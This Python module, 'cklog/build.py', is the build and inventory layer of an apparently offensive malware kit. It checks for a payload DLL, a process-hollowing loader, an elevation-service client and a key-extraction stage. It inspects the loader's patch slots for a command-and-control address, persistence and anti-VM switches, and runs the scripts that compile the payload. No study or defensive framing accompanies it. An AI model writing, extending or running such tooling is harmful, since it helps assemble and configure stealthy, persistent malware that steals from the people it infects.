# cklog/build.py -- artifact inventory and build orchestration.
#
# build.py (repo root) is the CLI; this module holds the pieces it needs so the
# same checks are available to auto.py and to tests.
import hashlib
import os

from . import pe, toolchain

# key, relative path, human description, required for a complete payload set
ARTIFACTS = (
    ("ckdll", "bin/ckdll.dll", "payload DLL", True),
    ("loader", "bin/loader.exe", "hollowing loader", True),
    ("ckdec", "bin/ckdec.exe", "elevation-service client", True),
    ("ckkey", "bin/ckkey.exe", "standalone key stage", True),
    ("ckdll.pdb", "bin/ckdll.pdb", "payload symbols", False),
)

# loader sentinels: (name, sentinel, slot)
SENTINELS = (
    ("c2", b"CKC2_DEADBEEF_", 256),
    ("persist", b"CKPR____", 8),
    ("anti-vm", b"CKAV0000", 8),
)

PATCHED = {
    "persist": b"CKPR0001",
    "anti-vm": b"CKAV0001",
}


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def read(path):
    with open(path, "rb") as f:
        return f.read()


def artifacts(root):
    """One row per expected artifact, including missing ones."""
    out = []
    for key, rel, desc, required in ARTIFACTS:
        p = os.path.join(root, rel)
        row = {"key": key, "path": p, "rel": rel, "desc": desc,
               "required": required, "exists": os.path.isfile(p),
               "size": 0, "sha256": "", "pe": False}
        if row["exists"]:
            row["size"] = os.path.getsize(p)
            row["sha256"] = sha256_file(p)
            row["pe"] = bool(pe.sections(read(p)))
        out.append(row)
    return out


def sentinels(root):
    """State of the loader's patch slots.

    state: free (unpatched sentinel), patched (already enabled/disabled),
    missing (literal absent), invalid (only found in .text).
    """
    p = os.path.join(root, "bin", "loader.exe")
    if not os.path.isfile(p):
        return []
    blob = read(p)
    out = []
    for name, sentinel, slot in SENTINELS:
        idx = pe.find_sentinel(blob, sentinel, slot)
        ready = pe.patch_ready(blob, sentinel, slot)
        where = pe.section_of(blob, idx) if idx >= 0 else ""
        if ready >= 0:
            state = "free"
        elif ready == -2:
            state = "patched"
        elif idx >= 0:
            state = "invalid"          # literal exists only where it must not be written
        else:
            state = "missing"
        if name in PATCHED and blob.find(PATCHED[name]) != -1:
            state = "patched"
        out.append({"name": name, "state": state, "offset": idx, "section": where})
    return out


def build_payload(root):
    ok, out = toolchain.run_script(root, "build.bat", timeout=600)
    return ok, out


def build_keytool(root):
    ok, out = toolchain.run_script(root, "build_keytool.bat", timeout=300)
    return ok, out


def toolchain_status(root):
    ok, info = toolchain.compiler_ready(root)
    return ok, info


def complete(root):
    rows = artifacts(root)
    return all(r["exists"] and r["pe"] for r in rows if r["required"])
